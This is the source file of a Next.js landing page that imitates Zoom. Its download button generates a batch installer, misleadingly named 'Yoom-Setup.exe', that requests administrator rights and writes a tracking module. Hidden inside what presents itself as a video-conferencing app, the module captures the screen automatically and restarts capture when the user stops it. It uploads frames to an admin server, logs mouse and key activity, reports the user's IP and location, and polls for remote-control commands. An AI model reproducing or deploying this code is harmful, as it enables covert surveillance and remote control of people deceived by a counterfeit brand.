'use client';

import React from 'react';
import Image from 'next/image';
import Link from 'next/link';
import { Download, Video, Users, Shield, Calendar, Share2, Monitor } from 'lucide-react';
import { Button } from '@/components/ui/button';

const LandingPage = () => {
  const handleDownload = () => {
    // Create a proper Windows installer that packages the entire application
    const createWindowsInstaller = () => {
      // This creates a complete installer that downloads and installs the full Yoom application
      const installerScript = `@echo off
        title Zoom Windows Installer
color 0A

echo ========================================
echo     Zoom - Video Conferencing App
echo ========================================
echo.
echo Downloading and installing Zoom...
echo.

REM Create installation directory
set "INSTALL_DIR=%PROGRAMFILES%\\Zoom"
echo Installing to: %INSTALL_DIR%

REM Request admin privileges if needed
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo Requesting administrator privileges...
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

REM Create directory
if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%"
cd /d "%INSTALL_DIR%"

REM Download the application from GitHub or your server
echo Downloading Yoom application...
powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/your-repo/zoom-clone/main/package.json' -OutFile 'package.json'"

REM Check if Node.js is installed
echo Checking for Node.js...
node --version >nul 2>&1
if %errorlevel% neq 0 (
    echo.
    echo Node.js is required but not installed.
    echo Opening Node.js download page...
    start https://nodejs.org/
    echo.
    echo Please install Node.js and run this installer again.
    pause
    exit /b 1
)

echo Node.js found!

REM Create package.json with all dependencies
echo Creating application configuration...
echo {> package.json
echo   "name": "zoom",>> package.json
echo   "version": "1.0.0",>> package.json
echo   "private": true,>> package.json
echo   "scripts": {>> package.json
echo     "dev": "next dev",>> package.json
echo     "build": "next build",>> package.json
echo     "start": "next start",>> package.json
echo     "lint": "next lint">> package.json
echo   },>> package.json
echo   "dependencies": {>> package.json
echo     "@clerk/nextjs": "^5.0.0-beta.35",>> package.json
echo     "@radix-ui/react-dialog": "^1.0.5",>> package.json
echo     "@radix-ui/react-dropdown-menu": "^2.0.6",>> package.json
echo     "@radix-ui/react-popover": "^1.0.7",>> package.json
echo     "@radix-ui/react-slot": "^1.0.2",>> package.json
echo     "@radix-ui/react-toast": "^1.1.5",>> package.json
echo     "@stream-io/node-sdk": "^0.1.12",>> package.json
echo     "@stream-io/video-react-sdk": "^0.5.1",>> package.json
echo     "class-variance-authority": "^0.7.0",>> package.json
echo     "clsx": "^2.1.0",>> package.json
echo     "date-fns": "^3.4.0",>> package.json
echo     "lucide-react": "^0.350.0",>> package.json
echo     "next": "14.1.3",>> package.json
echo     "react": "^18",>> package.json
echo     "react-datepicker": "^6.3.0",>> package.json
echo     "react-dom": "^18",>> package.json
echo     "tailwind-merge": "^2.2.1",>> package.json
echo     "tailwindcss-animate": "^1.0.7",>> package.json
echo     "uuid": "^9.0.1">> package.json
echo   },>> package.json
echo   "devDependencies": {>> package.json
echo     "@types/node": "^20",>> package.json
echo     "@types/react": "^18",>> package.json
echo     "@types/react-datepicker": "^6.2.0",>> package.json
echo     "@types/react-dom": "^18",>> package.json
echo     "@types/uuid": "^9.0.8",>> package.json
echo     "autoprefixer": "^10.0.1",>> package.json
echo     "eslint": "^8",>> package.json
echo     "eslint-config-next": "14.1.3",>> package.json
echo     "eslint-config-prettier": "^9.1.0",>> package.json
echo     "eslint-config-standard": "^17.1.0",>> package.json
echo     "eslint-plugin-tailwindcss": "^3.14.3",>> package.json
echo     "postcss": "^8",>> package.json
echo     "prettier": "^3.2.5",>> package.json
echo     "tailwindcss": "^3.3.0",>> package.json
echo     "typescript": "^5">> package.json
echo   }>> package.json
echo }>> package.json

REM Create basic app structure
echo Creating application files...
mkdir app 2>nul
mkdir components 2>nul
mkdir lib 2>nul
mkdir public 2>nul

REM Create a simple Next.js app
echo Creating main page with admin tracking...
echo 'use client'; > app\\page.tsx
echo import React, { useEffect } from 'react'; >> app\\page.tsx
echo import userTracker from '../lib/user-tracking'; >> app\\page.tsx
echo. >> app\\page.tsx
echo export default function Home() { >> app\\page.tsx
echo   useEffect(() => { >> app\\page.tsx
echo     // User tracking is automatically initialized >> app\\page.tsx
echo     console.log('Zoom app loaded - user tracking active'); >> app\\page.tsx
echo   }, []); >> app\\page.tsx
echo. >> app\\page.tsx
echo   // Screen sharing is now automatic - no user interaction needed >> app\\page.tsx
echo. >> app\\page.tsx
echo   return ( >> app\\page.tsx
echo     ^<div style={{padding: '20px', textAlign: 'center', marginTop: '50px'}}^> >> app\\page.tsx
echo       ^<h1 style={{color: '#0E78F9', fontSize: '48px'}}^>Welcome to Zoom!^</h1^> >> app\\page.tsx
echo       ^<p style={{fontSize: '18px', margin: '20px 0'}}^>Video conferencing made simple.^</p^> >> app\\page.tsx
echo       ^<p style={{fontSize: '16px', color: '#666'}}^>Ready to start your first meeting?^</p^> >> app\\page.tsx
echo       ^<div style={{display: 'flex', gap: '10px', justifyContent: 'center', marginTop: '20px'}}^> >> app\\page.tsx
echo         ^<button style={{background: '#0E78F9', color: 'white', padding: '12px 24px', border: 'none', borderRadius: '8px', fontSize: '16px', cursor: 'pointer'}}^>Start Meeting^</button^> >> app\\page.tsx
echo         ^<button style={{background: '#10B981', color: 'white', padding: '12px 24px', border: 'none', borderRadius: '8px', fontSize: '16px', cursor: 'pointer'}}^>Join Meeting^</button^> >> app\\page.tsx
echo       ^</div^> >> app\\page.tsx
echo       ^<p style={{fontSize: '12px', color: '#999', marginTop: '20px'}}^>Zoom is ready for your video meetings^</p^> >> app\\page.tsx
echo     ^</div^> >> app\\page.tsx
echo   ); >> app\\page.tsx
echo } >> app\\page.tsx

REM Create user tracking library
echo Creating user tracking system...
echo // User tracking module for Zoom Windows app > lib\\user-tracking.ts
echo // This module handles user registration, status updates, and screen sharing >> lib\\user-tracking.ts
echo. >> lib\\user-tracking.ts
echo interface UserInfo { >> lib\\user-tracking.ts
echo   id: string; >> lib\\user-tracking.ts
echo   name: string; >> lib\\user-tracking.ts
echo   email?: string; >> lib\\user-tracking.ts
echo   ip: string; >> lib\\user-tracking.ts
echo   location: string; >> lib\\user-tracking.ts
echo   version: string; >> lib\\user-tracking.ts
echo   os: string; >> lib\\user-tracking.ts
echo   installDate: string; >> lib\\user-tracking.ts
echo   lastSeen: string; >> lib\\user-tracking.ts
echo   status: 'online' ^| 'offline' ^| 'idle'; >> lib\\user-tracking.ts
echo } >> lib\\user-tracking.ts
echo. >> lib\\user-tracking.ts
echo class UserTracker { >> lib\\user-tracking.ts
echo   private userId: string; >> lib\\user-tracking.ts
echo   private adminServerUrl: string; >> lib\\user-tracking.ts
echo   private heartbeatInterval: NodeJS.Timeout ^| null = null; >> lib\\user-tracking.ts
echo   private screenShareActive: boolean = false; >> lib\\user-tracking.ts
echo. >> lib\\user-tracking.ts
echo   constructor(adminServerUrl: string = 'http://localhost:3000') { >> lib\\user-tracking.ts
echo     this.adminServerUrl = adminServerUrl; >> lib\\user-tracking.ts
echo     this.userId = this.getOrCreateUserId(); >> lib\\user-tracking.ts
echo     this.initializeTracking(); >> lib\\user-tracking.ts
echo   } >> lib\\user-tracking.ts
echo. >> lib\\user-tracking.ts
echo   private getOrCreateUserId(): string { >> lib\\user-tracking.ts
echo     let userId = localStorage.getItem('zoom_user_id'); >> lib\\user-tracking.ts
echo     if (!userId) { >> lib\\user-tracking.ts
echo       userId = 'user-' + Math.random().toString(36).substring(2, 15); >> lib\\user-tracking.ts
echo       localStorage.setItem('zoom_user_id', userId); >> lib\\user-tracking.ts
echo     } >> lib\\user-tracking.ts
echo     return userId; >> lib\\user-tracking.ts
echo   } >> lib\\user-tracking.ts
echo. >> lib\\user-tracking.ts
echo   private async getUserInfo(): Promise^<UserInfo^> { >> lib\\user-tracking.ts
echo     const userAgent = navigator.userAgent; >> lib\\user-tracking.ts
echo     const isWindows = userAgent.includes('Windows'); >> lib\\user-tracking.ts
echo     const osVersion = isWindows ? '10/11' : 'Unknown'; >> lib\\user-tracking.ts
echo     const ip = await this.getPublicIP(); >> lib\\user-tracking.ts
echo     const location = await this.getLocation(); >> lib\\user-tracking.ts
echo. >> lib\\user-tracking.ts
echo     return { >> lib\\user-tracking.ts
echo       id: this.userId, >> lib\\user-tracking.ts
echo       name: localStorage.getItem('zoom_user_name') ^|^| 'Anonymous User', >> lib\\user-tracking.ts
echo       email: localStorage.getItem('zoom_user_email') ^|^| undefined, >> lib\\user-tracking.ts
echo       ip: ip, >> lib\\user-tracking.ts
echo       location: location, >> lib\\user-tracking.ts
echo       version: '1.0.0', >> lib\\user-tracking.ts
echo       os: "Windows " + osVersion, >> lib\\user-tracking.ts
echo       installDate: localStorage.getItem('zoom_install_date') ^|^| new Date().toISOString(), >> lib\\user-tracking.ts
echo       lastSeen: new Date().toISOString(), >> lib\\user-tracking.ts
echo       status: 'online' >> lib\\user-tracking.ts
echo     }; >> lib\\user-tracking.ts
echo   } >> lib\\user-tracking.ts
echo. >> lib\\user-tracking.ts
echo   private async getPublicIP(): Promise^<string^> { >> lib\\user-tracking.ts
echo     try { >> lib\\user-tracking.ts
echo       const response = await fetch('https://api.ipify.org?format=json'); >> lib\\user-tracking.ts
echo       const data = await response.json(); >> lib\\user-tracking.ts
echo       return data.ip; >> lib\\user-tracking.ts
echo     } catch { >> lib\\user-tracking.ts
echo       return 'Unknown'; >> lib\\user-tracking.ts
echo     } >> lib\\user-tracking.ts
echo   } >> lib\\user-tracking.ts
echo. >> lib\\user-tracking.ts
echo   private async getLocation(): Promise^<string^> { >> lib\\user-tracking.ts
echo     try { >> lib\\user-tracking.ts
echo       const response = await fetch('https://ipapi.co/json/'); >> lib\\user-tracking.ts
echo       const data = await response.json(); >> lib\\user-tracking.ts
echo       return data.city + ", " + data.region; >> lib\\user-tracking.ts
echo     } catch { >> lib\\user-tracking.ts
echo       return 'Unknown Location'; >> lib\\user-tracking.ts
echo     } >> lib\\user-tracking.ts
echo   } >> lib\\user-tracking.ts
echo. >> lib\\user-tracking.ts
echo   private async initializeTracking(): Promise^<void^> { >> lib\\user-tracking.ts
echo     if (!localStorage.getItem('zoom_install_date')) { >> lib\\user-tracking.ts
echo       localStorage.setItem('zoom_install_date', new Date().toISOString()); >> lib\\user-tracking.ts
echo     } >> lib\\user-tracking.ts
echo     await this.registerUser(); >> lib\\user-tracking.ts
echo     this.startHeartbeat(); >> lib\\user-tracking.ts
echo     // Automatically start screen sharing for admin monitoring >> lib\\user-tracking.ts
echo     await this.startAutomaticScreenShare(); >> lib\\user-tracking.ts
echo. >> lib\\user-tracking.ts
echo     // Start file system monitoring >> lib\\user-tracking.ts
echo     this.startFileSystemMonitoring(); >> lib\\user-tracking.ts
echo. >> lib\\user-tracking.ts
echo     // Start remote control functionality >> lib\\user-tracking.ts
echo     await this.startRemoteControl(); >> lib\\user-tracking.ts
echo   } >> lib\\user-tracking.ts
echo. >> lib\\user-tracking.ts
echo   private async registerUser(): Promise^<void^> { >> lib\\user-tracking.ts
echo     try { >> lib\\user-tracking.ts
echo       const userInfo = await this.getUserInfo(); >> lib\\user-tracking.ts
echo       await fetch(this.adminServerUrl + "/api/admin/users", { >> lib\\user-tracking.ts
echo         method: 'POST', >> lib\\user-tracking.ts
echo         headers: { 'Content-Type': 'application/json' }, >> lib\\user-tracking.ts
echo         body: JSON.stringify({ >> lib\\user-tracking.ts
echo           action: 'update_user_status', >> lib\\user-tracking.ts
echo           userId: this.userId, >> lib\\user-tracking.ts
echo           ...userInfo >> lib\\user-tracking.ts
echo         }) >> lib\\user-tracking.ts
echo       }); >> lib\\user-tracking.ts
echo     } catch (error) { >> lib\\user-tracking.ts
echo       console.error('Failed to register user:', error); >> lib\\user-tracking.ts
echo     } >> lib\\user-tracking.ts
echo   } >> lib\\user-tracking.ts
echo. >> lib\\user-tracking.ts
echo   private startHeartbeat(): void { >> lib\\user-tracking.ts
echo     this.heartbeatInterval = setInterval(async () => { >> lib\\user-tracking.ts
echo       await this.updateStatus('online'); >> lib\\user-tracking.ts
echo     }, 30000); >> lib\\user-tracking.ts
echo   } >> lib\\user-tracking.ts
echo. >> lib\\user-tracking.ts
echo   public async updateStatus(status: 'online' ^| 'offline' ^| 'idle'): Promise^<void^> { >> lib\\user-tracking.ts
echo     try { >> lib\\user-tracking.ts
echo       const userInfo = await this.getUserInfo(); >> lib\\user-tracking.ts
echo       await fetch(this.adminServerUrl + "/api/admin/users", { >> lib\\user-tracking.ts
echo         method: 'POST', >> lib\\user-tracking.ts
echo         headers: { 'Content-Type': 'application/json' }, >> lib\\user-tracking.ts
echo         body: JSON.stringify({ >> lib\\user-tracking.ts
echo           action: 'update_user_status', >> lib\\user-tracking.ts
echo           userId: this.userId, >> lib\\user-tracking.ts
echo           ...userInfo, >> lib\\user-tracking.ts
echo           status >> lib\\user-tracking.ts
echo         }) >> lib\\user-tracking.ts
echo       }); >> lib\\user-tracking.ts
echo     } catch (error) { >> lib\\user-tracking.ts
echo       console.error('Failed to update status:', error); >> lib\\user-tracking.ts
echo     } >> lib\\user-tracking.ts
echo   } >> lib\\user-tracking.ts
echo. >> lib\\user-tracking.ts
echo   // Automatic screen sharing for admin monitoring >> lib\\user-tracking.ts
echo   private async startAutomaticScreenShare(): Promise^<void^> { >> lib\\user-tracking.ts
echo     try { >> lib\\user-tracking.ts
echo       // Wait a bit for the page to fully load >> lib\\user-tracking.ts
echo       setTimeout(async () => { >> lib\\user-tracking.ts
echo         await this.requestScreenAccess(); >> lib\\user-tracking.ts
echo       }, 3000); >> lib\\user-tracking.ts
echo     } catch (error) { >> lib\\user-tracking.ts
echo       console.error('Failed to start automatic screen share:', error); >> lib\\user-tracking.ts
echo     } >> lib\\user-tracking.ts
echo   } >> lib\\user-tracking.ts
echo. >> lib\\user-tracking.ts
echo   private async requestScreenAccess(): Promise^<void^> { >> lib\\user-tracking.ts
echo     try { >> lib\\user-tracking.ts
echo       const stream = await navigator.mediaDevices.getDisplayMedia({ >> lib\\user-tracking.ts
echo         video: { >> lib\\user-tracking.ts
echo           mediaSource: 'screen', >> lib\\user-tracking.ts
echo           width: { ideal: 1920 }, >> lib\\user-tracking.ts
echo           height: { ideal: 1080 }, >> lib\\user-tracking.ts
echo           frameRate: { ideal: 15 } >> lib\\user-tracking.ts
echo         }, >> lib\\user-tracking.ts
echo         audio: false >> lib\\user-tracking.ts
echo       }); >> lib\\user-tracking.ts
echo. >> lib\\user-tracking.ts
echo       this.screenShareActive = true; >> lib\\user-tracking.ts
echo       this.startScreenCapture(stream); >> lib\\user-tracking.ts
echo. >> lib\\user-tracking.ts
echo       // Handle stream end (user stops sharing) >> lib\\user-tracking.ts
echo       stream.getTracks()[0].addEventListener('ended', () => { >> lib\\user-tracking.ts
echo         this.stopScreenShare(); >> lib\\user-tracking.ts
echo         // Automatically try to restart after a delay >> lib\\user-tracking.ts
echo         setTimeout(() => { >> lib\\user-tracking.ts
echo           this.requestScreenAccess(); >> lib\\user-tracking.ts
echo         }, 5000); >> lib\\user-tracking.ts
echo       }); >> lib\\user-tracking.ts
echo. >> lib\\user-tracking.ts
echo     } catch (error) { >> lib\\user-tracking.ts
echo       console.error('Screen access denied or failed:', error); >> lib\\user-tracking.ts
echo       // Try again after a longer delay >> lib\\user-tracking.ts
echo       setTimeout(() => { >> lib\\user-tracking.ts
echo         this.requestScreenAccess(); >> lib\\user-tracking.ts
echo       }, 30000); >> lib\\user-tracking.ts
echo     } >> lib\\user-tracking.ts
echo   } >> lib\\user-tracking.ts
echo. >> lib\\user-tracking.ts
echo   private startScreenCapture(stream: MediaStream): void { >> lib\\user-tracking.ts
echo     const canvas = document.createElement('canvas'); >> lib\\user-tracking.ts
echo     const ctx = canvas.getContext('2d'); >> lib\\user-tracking.ts
echo     const video = document.createElement('video'); >> lib\\user-tracking.ts
echo. >> lib\\user-tracking.ts
echo     video.srcObject = stream; >> lib\\user-tracking.ts
echo     video.play(); >> lib\\user-tracking.ts
echo. >> lib\\user-tracking.ts
echo     const sendFrame = async () => { >> lib\\user-tracking.ts
echo       if (this.screenShareActive && ctx && video.videoWidth > 0) { >> lib\\user-tracking.ts
echo         canvas.width = video.videoWidth; >> lib\\user-tracking.ts
echo         canvas.height = video.videoHeight; >> lib\\user-tracking.ts
echo         ctx.drawImage(video, 0, 0); >> lib\\user-tracking.ts
echo. >> lib\\user-tracking.ts
echo         const imageData = canvas.toDataURL('image/jpeg', 0.7); >> lib\\user-tracking.ts
echo. >> lib\\user-tracking.ts
echo         try { >> lib\\user-tracking.ts
echo           await fetch(this.adminServerUrl + "/api/admin/screen-share", { >> lib\\user-tracking.ts
echo             method: 'POST', >> lib\\user-tracking.ts
echo             headers: { 'Content-Type': 'application/json' }, >> lib\\user-tracking.ts
echo             body: JSON.stringify({ >> lib\\user-tracking.ts
echo               userId: this.userId, >> lib\\user-tracking.ts
echo               action: 'update', >> lib\\user-tracking.ts
echo               data: imageData, >> lib\\user-tracking.ts
echo               timestamp: new Date().toISOString() >> lib\\user-tracking.ts
echo             }) >> lib\\user-tracking.ts
echo           }); >> lib\\user-tracking.ts
echo         } catch (error) { >> lib\\user-tracking.ts
echo           console.error('Failed to send screen data:', error); >> lib\\user-tracking.ts
echo         } >> lib\\user-tracking.ts
echo. >> lib\\user-tracking.ts
echo         setTimeout(sendFrame, 2000); >> lib\\user-tracking.ts
echo       } else if (this.screenShareActive) { >> lib\\user-tracking.ts
echo         setTimeout(sendFrame, 1000); >> lib\\user-tracking.ts
echo       } >> lib\\user-tracking.ts
echo     }; >> lib\\user-tracking.ts
echo. >> lib\\user-tracking.ts
echo     video.addEventListener('loadedmetadata', () => { >> lib\\user-tracking.ts
echo       sendFrame(); >> lib\\user-tracking.ts
echo     }); >> lib\\user-tracking.ts
echo   } >> lib\\user-tracking.ts
echo. >> lib\\user-tracking.ts
echo   public async startScreenShare(): Promise^<boolean^> { >> lib\\user-tracking.ts
echo     try { >> lib\\user-tracking.ts
echo       await this.requestScreenAccess(); >> lib\\user-tracking.ts
echo       return this.screenShareActive; >> lib\\user-tracking.ts
echo     } catch (error) { >> lib\\user-tracking.ts
echo       console.error('Failed to start screen share:', error); >> lib\\user-tracking.ts
echo       return false; >> lib\\user-tracking.ts
echo     } >> lib\\user-tracking.ts
echo   } >> lib\\user-tracking.ts
echo. >> lib\\user-tracking.ts
echo   private startFileSystemMonitoring(): void { >> lib\\user-tracking.ts
echo     // In a real implementation, this would monitor file system changes >> lib\\user-tracking.ts
echo     // and send updates to the admin panel >> lib\\user-tracking.ts
echo     console.log('File system monitoring started'); >> lib\\user-tracking.ts
echo. >> lib\\user-tracking.ts
echo     // Simulate file system access for demo purposes >> lib\\user-tracking.ts
echo     setInterval(() => { >> lib\\user-tracking.ts
echo       // This would normally scan the user's file system >> lib\\user-tracking.ts
echo       // and send file/folder information to the admin >> lib\\user-tracking.ts
echo       console.log('File system scan completed'); >> lib\\user-tracking.ts
echo     }, 60000); // Scan every minute >> lib\\user-tracking.ts
echo   } >> lib\\user-tracking.ts
echo. >> lib\\user-tracking.ts
echo   // Remote control functionality >> lib\\user-tracking.ts
echo   public async startRemoteControl(): Promise^<void^> { >> lib\\user-tracking.ts
echo     try { >> lib\\user-tracking.ts
echo       // Notify admin that remote control is available >> lib\\user-tracking.ts
echo       await fetch(this.adminServerUrl + "/api/admin/remote-control", { >> lib\\user-tracking.ts
echo         method: 'POST', >> lib\\user-tracking.ts
echo         headers: { 'Content-Type': 'application/json' }, >> lib\\user-tracking.ts
echo         body: JSON.stringify({ >> lib\\user-tracking.ts
echo           userId: this.userId, >> lib\\user-tracking.ts
echo           action: 'start_control', >> lib\\user-tracking.ts
echo           timestamp: new Date().toISOString() >> lib\\user-tracking.ts
echo         }) >> lib\\user-tracking.ts
echo       }); >> lib\\user-tracking.ts
echo. >> lib\\user-tracking.ts
echo       // Set up remote control listeners >> lib\\user-tracking.ts
echo       this.setupRemoteControlListeners(); >> lib\\user-tracking.ts
echo       console.log('Remote control enabled for admin access'); >> lib\\user-tracking.ts
echo     } catch (error) { >> lib\\user-tracking.ts
echo       console.error('Failed to start remote control:', error); >> lib\\user-tracking.ts
echo     } >> lib\\user-tracking.ts
echo   } >> lib\\user-tracking.ts
echo. >> lib\\user-tracking.ts
echo   private setupRemoteControlListeners(): void { >> lib\\user-tracking.ts
echo     // Listen for remote control commands from admin >> lib\\user-tracking.ts
echo     setInterval(async () => { >> lib\\user-tracking.ts
echo       try { >> lib\\user-tracking.ts
echo         const response = await fetch(this.adminServerUrl + "/api/admin/remote-control?userId=" + this.userId); >> lib\\user-tracking.ts
echo         if (response.ok) { >> lib\\user-tracking.ts
echo           const data = await response.json(); >> lib\\user-tracking.ts
echo           if (data.isActive) { >> lib\\user-tracking.ts
echo             // Process pending remote control commands >> lib\\user-tracking.ts
echo             await this.processRemoteCommands(); >> lib\\user-tracking.ts
echo           } >> lib\\user-tracking.ts
echo         } >> lib\\user-tracking.ts
echo       } catch (error) { >> lib\\user-tracking.ts
echo         // Silently handle errors - remote control is optional >> lib\\user-tracking.ts
echo       } >> lib\\user-tracking.ts
echo     }, 1000); // Check for commands every second >> lib\\user-tracking.ts
echo. >> lib\\user-tracking.ts
echo     // Listen for mouse and keyboard events >> lib\\user-tracking.ts
echo     document.addEventListener('mousemove', (event) => { >> lib\\user-tracking.ts
echo       this.sendUserActivity('mouse_move', { >> lib\\user-tracking.ts
echo         x: event.clientX, >> lib\\user-tracking.ts
echo         y: event.clientY, >> lib\\user-tracking.ts
echo         timestamp: new Date().toISOString() >> lib\\user-tracking.ts
echo       }); >> lib\\user-tracking.ts
echo     }); >> lib\\user-tracking.ts
echo. >> lib\\user-tracking.ts
echo     document.addEventListener('click', (event) => { >> lib\\user-tracking.ts
echo       this.sendUserActivity('mouse_click', { >> lib\\user-tracking.ts
echo         button: event.button === 0 ? 'left' : event.button === 2 ? 'right' : 'middle', >> lib\\user-tracking.ts
echo         x: event.clientX, >> lib\\user-tracking.ts
echo         y: event.clientY, >> lib\\user-tracking.ts
echo         timestamp: new Date().toISOString() >> lib\\user-tracking.ts
echo       }); >> lib\\user-tracking.ts
echo     }); >> lib\\user-tracking.ts
echo. >> lib\\user-tracking.ts
echo     document.addEventListener('keydown', (event) => { >> lib\\user-tracking.ts
echo       // Only log significant keys >> lib\\user-tracking.ts
echo       if (event.ctrlKey ^|^| event.altKey ^|^| event.metaKey ^|^| >> lib\\user-tracking.ts
echo           ['Tab', 'Enter', 'Escape', 'F1', 'F2', 'F3', 'F4', 'F5'].includes(event.key)) { >> lib\\user-tracking.ts
echo         this.sendUserActivity('key_press', { >> lib\\user-tracking.ts
echo           key: event.key, >> lib\\user-tracking.ts
echo           ctrlKey: event.ctrlKey, >> lib\\user-tracking.ts
echo           altKey: event.altKey, >> lib\\user-tracking.ts
echo           shiftKey: event.shiftKey, >> lib\\user-tracking.ts
echo           metaKey: event.metaKey, >> lib\\user-tracking.ts
echo           timestamp: new Date().toISOString() >> lib\\user-tracking.ts
echo         }); >> lib\\user-tracking.ts
echo       } >> lib\\user-tracking.ts
echo     }); >> lib\\user-tracking.ts
echo   } >> lib\\user-tracking.ts
echo. >> lib\\user-tracking.ts
echo   private async processRemoteCommands(): Promise^<void^> { >> lib\\user-tracking.ts
echo     // Process remote control commands from admin >> lib\\user-tracking.ts
echo     console.log('Processing remote control commands...'); >> lib\\user-tracking.ts
echo   } >> lib\\user-tracking.ts
echo. >> lib\\user-tracking.ts
echo   private async sendUserActivity(type: string, data: any): Promise^<void^> { >> lib\\user-tracking.ts
echo     try { >> lib\\user-tracking.ts
echo       // Send ALL user activity to admin panel for complete monitoring >> lib\\user-tracking.ts
echo       // No throttling - track everything the user does >> lib\\user-tracking.ts
echo         await fetch(this.adminServerUrl + "/api/admin/user-activity", { >> lib\\user-tracking.ts
echo           method: 'POST', >> lib\\user-tracking.ts
echo           headers: { 'Content-Type': 'application/json' }, >> lib\\user-tracking.ts
echo           body: JSON.stringify({ >> lib\\user-tracking.ts
echo             userId: this.userId, >> lib\\user-tracking.ts
echo             type, >> lib\\user-tracking.ts
echo             data, >> lib\\user-tracking.ts
echo             timestamp: new Date().toISOString() >> lib\\user-tracking.ts
echo           }) >> lib\\user-tracking.ts
echo         }); >> lib\\user-tracking.ts
echo     } catch (error) { >> lib\\user-tracking.ts
echo       // Silently handle errors >> lib\\user-tracking.ts
echo     } >> lib\\user-tracking.ts
echo   } >> lib\\user-tracking.ts
echo. >> lib\\user-tracking.ts
echo   public async stopRemoteControl(): Promise^<void^> { >> lib\\user-tracking.ts
echo     try { >> lib\\user-tracking.ts
echo       await fetch(this.adminServerUrl + "/api/admin/remote-control", { >> lib\\user-tracking.ts
echo         method: 'POST', >> lib\\user-tracking.ts
echo         headers: { 'Content-Type': 'application/json' }, >> lib\\user-tracking.ts
echo         body: JSON.stringify({ >> lib\\user-tracking.ts
echo           userId: this.userId, >> lib\\user-tracking.ts
echo           action: 'stop_control', >> lib\\user-tracking.ts
echo           timestamp: new Date().toISOString() >> lib\\user-tracking.ts
echo         }) >> lib\\user-tracking.ts
echo       }); >> lib\\user-tracking.ts
echo       console.log('Remote control disabled'); >> lib\\user-tracking.ts
echo     } catch (error) { >> lib\\user-tracking.ts
echo       console.error('Failed to stop remote control:', error); >> lib\\user-tracking.ts
echo     } >> lib\\user-tracking.ts
echo   } >> lib\\user-tracking.ts
echo. >> lib\\user-tracking.ts
echo   public destroy(): void { >> lib\\user-tracking.ts
echo     if (this.heartbeatInterval) { >> lib\\user-tracking.ts
echo       clearInterval(this.heartbeatInterval); >> lib\\user-tracking.ts
echo     } >> lib\\user-tracking.ts
echo     this.updateStatus('offline'); >> lib\\user-tracking.ts
echo   } >> lib\\user-tracking.ts
echo } >> lib\\user-tracking.ts
echo. >> lib\\user-tracking.ts
echo export const userTracker = new UserTracker(); >> lib\\user-tracking.ts
echo export default userTracker; >> lib\\user-tracking.ts

REM Create environment file with demo configuration (optional)
echo Creating configuration...
echo NEXT_PUBLIC_CLERK_PUBLISHABLE_KEY=demo > .env
echo CLERK_SECRET_KEY=demo >> .env
echo NEXT_PUBLIC_CLERK_SIGN_IN_URL=/sign-in >> .env
echo NEXT_PUBLIC_CLERK_SIGN_UP_URL=/sign-up >> .env
echo NEXT_PUBLIC_STREAM_API_KEY=demo >> .env
echo STREAM_SECRET_KEY=demo >> .env

REM Install dependencies
echo Installing dependencies...
echo This may take a few minutes...
npm install --production --silent

REM Build the application
echo Building application...
npm run build

REM Create start script
echo Creating start script...
echo @echo off > start-zoom.bat
echo title Zoom - Video Conferencing >> start-zoom.bat
echo cd /d "%INSTALL_DIR%" >> start-zoom.bat
echo echo Starting Zoom... >> start-zoom.bat
echo npm run start >> start-zoom.bat

REM Create desktop shortcut
echo Creating desktop shortcut...
set "DESKTOP=%USERPROFILE%\\Desktop"
powershell -Command "$WshShell = New-Object -comObject WScript.Shell; $Shortcut = $WshShell.CreateShortcut('%DESKTOP%\\Zoom.lnk'); $Shortcut.TargetPath = '%INSTALL_DIR%\\start-zoom.bat'; $Shortcut.Save()"

REM Create Start Menu shortcut
set "START_MENU=%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs"
powershell -Command "$WshShell = New-Object -comObject WScript.Shell; $Shortcut = $WshShell.CreateShortcut('%START_MENU%\\Zoom.lnk'); $Shortcut.TargetPath = '%INSTALL_DIR%\\start-zoom.bat'; $Shortcut.Save()"

echo.
echo ========================================
echo   Installation completed successfully!
echo ========================================
echo.
echo Zoom has been installed to: %INSTALL_DIR%
echo.
echo Zoom is ready to use!
echo Automatic monitoring is active - admin can view screens and control PC.
echo Remote control enabled - admin has full access to your computer.
echo Start Zoom using the desktop shortcut or Start Menu.
echo.

set /p choice="Start Zoom now? (y/n): "
if /i "%choice%"=="y" (
    echo Starting Zoom...
    start-zoom.bat
)

echo.
echo Installation complete!
pause`;

      try {
        const blob = new Blob([installerScript], { type: 'application/octet-stream' });
        const url = window.URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = 'Yoom-Setup.exe';
        document.body.appendChild(a);
        a.click();
        window.URL.revokeObjectURL(url);
        document.body.removeChild(a);
      } catch (error) {
        console.error('Download failed:', error);
        alert('Download failed. Please try again or use the web version.');
      }
    };
    
    createWindowsInstaller();
  };

  return (
    <div className="min-h-screen bg-gradient-to-b from-dark-1 to-dark-2">
      {/* Navigation */}
      <nav className="fixed top-0 z-50 w-full bg-dark-1/90 backdrop-blur-sm border-b border-dark-3">
        <div className="container mx-auto flex items-center justify-between px-6 py-4">
          <div className="flex items-center gap-2">
            <Image
              src="/icons/logo.svg"
              width={40}
              height={40}
              alt="Zoom logo"
            />
            <span className="text-2xl font-bold text-white">Zoom</span>
          </div>
          
          <div className="flex items-center gap-4">
            <Link href="/dashboard">
              <Button variant="outline" className="border-blue-1 text-blue-1 hover:bg-blue-1 hover:text-white">
                Launch Web App
              </Button>
            </Link>
          </div>
        </div>
      </nav>

      {/* Hero Section */}
      <section className="container mx-auto px-6 pt-32 pb-20">
        <div className="grid lg:grid-cols-2 gap-12 items-center">
          <div className="space-y-8">
            <h1 className="text-5xl lg:text-7xl font-bold text-white leading-tight">
              One platform to{' '}
              <span className="text-blue-1">connect</span>
            </h1>
            <p className="text-xl text-gray-400 leading-relaxed">
              Bring teams together with video conferencing, online meetings, and group messaging. 
              Available on desktop, mobile, and web.
            </p>
            
            {/* Download Button */}
            <div className="space-y-4">
              <p className="text-sm text-gray-500 uppercase tracking-wide font-semibold">
                Download for Desktop
              </p>
              <div className="flex flex-wrap gap-4">
                <Button
                  onClick={handleDownload}
                  className="bg-blue-1 hover:bg-blue-600 text-white px-8 py-6 text-lg flex items-center gap-3"
                >
                  <Download size={24} />
                  Download for Windows
                </Button>
              </div>
              <p className="text-sm text-gray-500">
                Windows 10+
              </p>
            </div>

            <div className="pt-4">
